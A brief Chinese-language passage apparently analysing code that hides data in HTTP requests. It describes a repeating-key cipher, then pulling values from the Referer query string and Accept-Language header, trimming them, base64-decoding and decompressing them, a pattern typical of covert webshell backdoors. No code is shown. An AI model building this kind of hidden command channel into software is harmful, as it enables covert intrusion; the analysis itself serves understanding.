关于正则表达式：

代码首先是交代了一个加密算法，$k为密钥，$t为明文，用密钥的每一位和明文进行加密，若密钥位数小于明文，则循环使用。接下来将 referer 的 query string 的 各个value取出到 $q。然后分析 Accept-Language，提取每种语言的首字母和权重数字。然后最重要的是它先去掉了前三位和后三位，然后替代，再base64解密，最后解压。
